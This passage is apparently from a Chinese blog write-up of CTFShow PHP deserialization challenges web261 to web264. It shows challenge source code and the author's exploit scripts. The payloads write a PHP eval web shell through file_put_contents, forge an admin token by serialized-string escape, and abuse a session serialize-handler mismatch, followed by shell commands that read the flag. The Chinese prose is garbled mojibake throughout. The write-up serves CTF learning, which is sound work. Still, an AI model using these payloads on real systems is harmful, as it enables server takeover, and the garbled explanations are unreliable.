<li>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œif åˆ¤æ–­ ä¸º ä¸¤ä¸ªç­‰å·å³å¼±ç±»å‹æ¯”è¾ƒï¼Œè€Œ 0x36 ä»åå…­è¿›åˆ¶è½¬ä¸ºåè¿›åˆ¶ä¸º 877ã€‚æ•…ï¼šåªè¦ code=877whatwhat éƒ½å¯ä»¥ä½¿æ­¤ if è¯­å¥ ä¸º true è¿›è€Œæ‰§è¡Œ file_put_contents()ï¼Œ file_put_contest() å‡½æ•°å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨å®ƒæ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</li>
<li>æ‰€ä»¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=<span class="number">877</span>shell.php</span><br><span class="line"><span class="variable">$password</span>=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬åœ°æ„é€ ä¸€ä¸‹:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;877shell.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœå¦‚ä¸‹:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web261.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>ctfshowvip%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22877</span>shell.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<ul>
<li>éªŒè¯:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web261_1.png"></p>
<ul>
<li>è¿è¡Œä¸æŠ¥é”™çš„è¯ï¼Œçœ‹çœ‹åœ¨ç›®å½•ä¸‹æ˜¯å¦ç”Ÿæˆäº† 877shell.php,åˆ«å¿˜äº† POSTä¼ å‚ã€‚</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web261_2.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºï¼ŒæˆåŠŸå¾—åˆ°äº† flag. </li>
</ul>
<h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨è¿™é“é¢˜çš„æ³¨é‡Šå½“ä¸­ï¼Œå‘ç°äº† message.php æ–‡ä»¶:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™é“é¢˜è€ƒå¯Ÿäº†PHPååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸é—®é¢˜ï¼Œè¿™é‡Œæ˜¯å¢åŠ ã€‚</li>
<li><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">ä¼ é€é—¨</a> è¿™ä½å¸ˆå‚…è®²çš„å¾ˆå¥½ã€‚</li>
<li>ä¸Šä»£ç :</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span>=<span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$ser_msg</span>=serialize(<span class="variable">$msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser_msg</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$umsg</span>=str_replace(<span class="string">&#x27;fuck&#x27;</span>,<span class="string">&#x27;loveU&#x27;</span>,<span class="variable">$ser_msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$umsg</span>=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœ,å°†ç”Ÿæˆçš„ base64,å†™å…¥åˆ°cookieä¸­å»ã€‚ç„¶åè®¿é—® message.php å³å¯å¾—åˆ°flagã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzU6ImxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVSI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7fSI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9</span><br></pre></td></tr></table></figure>

<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>æºç : <a href="http://www.zip/">www.zip</a> æ–‡ä»¶æ³„éœ²(index.php, check.php, inc.php)ã€‚</p>
<p><strong>åˆ†æ:</strong></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<ul>
<li>ä» ä¸‰ç›®è¿ç®—ç¬¦ å¯å¾—åˆ°: __ SESSION å¯æ§ï¼Œé€šè¿‡ __ COOKIE[â€˜limitâ€™] å¯æ§ã€‚</li>
</ul>
<p>inc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line">â€¦â€¦</span><br><span class="line">â€¦â€¦</span><br><span class="line">â€¦â€¦</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨ inc.phpä¸­ å¯ä»¥çœ‹åˆ° session_start() å¼€å¯äº† sessionä¼šè¯ã€‚</li>
<li>class User{} ä¸­ file_put_contents() æ–‡ä»¶å†™å…¥ï¼Œåˆ©ç”¨ç‚¹ã€‚</li>
<li>file_put_contents() ä¸­çš„æ–‡ä»¶å: log-xxx.php ã€‚</li>
<li>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™); å…¶ä¸­ session.serialize_handlerï¼š sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ phpã€‚è¿˜æœ‰å…¶å®ƒå¤„ç†å™¨å¦‚ä¸‹:</li>
<li>å®ä¾‹ä»£ç ä¾¿äºè§‚çœ‹å„ç§å¤„ç†å™¨ä¹‹é—´çš„æ ¼å¼:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&quot;admin&quot;</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">å¤„ç†å™¨</th>
<th>åºåˆ—åŒ–æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td align="center">session.serialize_handler=php</td>
<td>user|s:5:â€adminâ€;</td>
</tr>
<tr>
<td align="center">session.serialize_handler=php_serialize</td>
<td>a:1:{s:4:â€userâ€;s:5:â€adminâ€;}</td>
</tr>
<tr>
<td align="center">session.serialize_handler=php_binary</td>
<td>users:5:â€adminâ€; ï¼ˆ:äºŒè¿›åˆ¶æ•°æ®ï¼‰</td>
</tr>
</tbody></table>
<ul>
<li>sessionååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œå°†å¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ã€‚å› æ­¤å°±å¯ä»¥é’»ç©ºå­äº†ï¼Œæˆ‘ä»¬é€šè¿‡æ‰‹æ®µæ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚å…·ä½“çš„è¯ï¼Œæˆ‘æ˜¯ä¸ªå°ç™½ï¼Œè§£é‡Šä¸æ¸…ã€‚</li>
</ul>
<p>check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//å¯†ç å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span></span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;  </span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1])?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyMzoiPD9waHAgZXZhbCgkX1BPU1RbMV0pPz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>

<ul>
<li>æ›´æ”¹ index.phpä¸­ cookie:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_1.png"></p>
<ul>
<li>ç„¶ååˆ·æ–° index.php é¡µé¢</li>
<li>è®¿é—® check.phpï¼Œ ä¼šæ˜¾ç¤º ç™»é™†å¤±è´¥çš„ unicodeç¼–ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/check.php?u=<span class="number">111</span>&amp;pass=<span class="number">111</span> <span class="comment">// u&amp;pass éšä¾¿å†™</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_2.png"></p>
<ul>
<li>å°è¯•è®¿é—® log-1.php </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/log-<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_3.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º Notice è¯æ˜ log-1.phpå†™å…¥æˆåŠŸã€‚</li>
<li>post ä¼ å‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>=system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="number">1</span>=system(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_4.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_5.png"></p>
<ul>
<li>æˆåŠŸæ‹¿åˆ° flagã€‚</li>
</ul>
<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>æºç :</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 